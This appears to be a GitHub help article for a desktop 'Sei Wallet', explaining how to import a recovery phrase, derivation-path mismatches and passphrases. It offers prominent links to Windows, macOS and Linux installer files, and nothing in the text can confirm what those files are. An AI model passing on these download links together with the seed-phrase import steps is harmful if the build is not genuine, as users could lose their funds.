![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Importing an existing wallet into Sei Wallet</h1>

<p align="center">Bring an existing phrase across and confirm the address before moving funds.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Importing an existing wallet into Sei Wallet restores the same accounts from the phrase you already hold, in a new interface, without moving a coin. The funds never leave the chain; only the interface changes.

That makes importing the right tool for two situations - bringing an existing balance into this app, and getting back into an account after losing a device - and the wrong tool for starting fresh. If you want new accounts rather than your old ones, that is [creating a fresh wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md) instead.

## What the phrase reproduces

A recovery phrase is a number, and every key the wallet uses is derived from it by a fixed recipe. Same phrase, same recipe, same accounts. That is why an import can recover a balance years later with no company involvement, and why nobody can recover it without the phrase.

Two consequences worth holding onto:

- **The import is deterministic, not a lookup.** Nothing is fetched from the old wallet. If the derivation is right, the accounts appear because they were always derivable.
- **The phrase is the whole secret.** Whoever holds it can import the same accounts anywhere, which is why importing into a second application is a security decision and not just a convenience.

## Before you start

- **Have the phrase written down offline**, not in a screenshot, a chat message or a cloud note. If the only copy is digital, fix that before importing, not after.
- **Import only into software you verified.** A lookalike build will happily accept a phrase and send it somewhere. [the Sei Wallet safety notes](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md) cover what is and is not verified about this application; the download itself is a separate check.
- **Close the old wallet first**, or at least do not run both against the same hardware device at the same time.
- **Expect to enter the words in order**, usually twelve or twenty-four, usually with autocomplete on a known word list.

## The steps

1. Choose the import or restore option during setup, rather than "create new".
2. Enter the words in the order they were written. The order is part of the secret; a correct set in the wrong order is a different phrase.
3. Set a local password if the setup offers one. It guards the file on disk. It will not bring an account back.
4. Wait for the accounts to appear, then compare the address with the address your old wallet showed. Comparison is character by character; a near-match is a different account.
5. If the balance is missing, before assuming a problem, check the next section.

## When the address is different

This is the most common surprise, and it is usually not an error.

Wallets choose a derivation path, and different paths produce different accounts from the same phrase. Sei sits across two conventions: an Ethereum-style path (coin type 60) and a Cosmos-style path (coin type 118). An EVM-first app asks for the first; a Cosmos-first wallet asks for the second. Import the same phrase into both and you can legitimately see two different addresses, one holding your balance and one empty.

What to do:

- **Compare addresses before moving anything.** Get the address from the old wallet and check whether the new app shows it.
- **Add accounts until it appears.** Most wallets let you step through derivations; each step is a different account.
- **Check the address form as well as the derivation.** One account can be shown as `0x...` or `sei1...`, so an "empty" view may be the other representation rather than another account.
- **Do not send a test transfer to a doubtful address** to see what happens. That tests the address you already distrust.

If you came from a Cosmos-first wallet, [the Keplr difference](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md) explains which derivation that wallet used, and why the two views disagree.

## If you used an extra passphrase

Some setups let you attach a second secret to the phrase - often called a passphrase or a 25th word. It is not stored in the words, so the same twelve or twenty-four words with the passphrase omitted open a different, empty wallet.

If your old wallet used one, the import must use it too. If you are unsure whether it did, test with a small balance rather than assuming: an import that shows an empty account could be a wrong derivation, a missing passphrase, or simply the wrong account selected.

## Recovering after losing a device

The phrase is the recovery mechanism, and the device was never the account. Import it into any compatible wallet and the accounts return.

Three cautions:

- **Do not buy a "recovery service".** Deriving accounts from a phrase is local arithmetic; anything offering to do it for you is collecting the phrase.
- **Do not type the phrase into a website that offers to check it.** A restore is done in wallet software you control.
- **If the phrase itself is lost**, there is no route: no operator-side backup, no identity check, no exception.

## What import does not do

- **It does not merge accounts.** Importing two phrases gives you two sets of accounts, not one combined account.
- **It does not move funds.** Balances stay where they are on-chain; the app is a window.
- **It does not restore a password.** A local password from the old app is not part of the phrase.
- **It does not recreate history.** Transactions are on-chain and visible, but a fresh install may take time to display them.

## A note on where you import next

Every application you import a phrase into is another place that phrase can leak from, and another threat model holding the same secret. If you are choosing between a desktop app and a browser extension, [the desktop-or-extension choice](https://github.com/sei-chain/sei-wallet-setup/blob/main/desktop-app-or-browser-extension.md) covers the trade; the short version is that separate phrases for separate purposes beat one phrase everywhere.

What the app is, and who runs it, is covered in [what the app is](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## Frequently asked questions

**Does importing move my funds?** No. It derives the same accounts locally; the balance never leaves the chain.

**Why does the imported wallet show a different address?** A different derivation path, most often coin type 60 versus 118. Both accounts are real; only one holds the balance.

**Can I import the same phrase into two wallets?** Yes, and it doubles the exposure. Consider separate phrases for separate roles.

**What if I mistype a word?** The import usually fails on an unknown word, or produces a different, empty account. Re-enter from your written copy rather than guessing.

**Can I recover a wallet without the phrase?** No. There is no operator-side recovery path by design.

**Is importing safe?** It is safe in software you verified, entered locally. It is disastrous in a lookalike build or a website that offers to do it for you.

**Do I need the old app to import?** No. You need the phrase and, ideally, the old address to compare against.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [How to create a Sei wallet and what the setup asks for](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
- [Sei Wallet and Keplr: two ways to hold SEI](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md)
- [A desktop Sei Wallet or a browser extension: which to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/desktop-app-or-browser-extension.md)
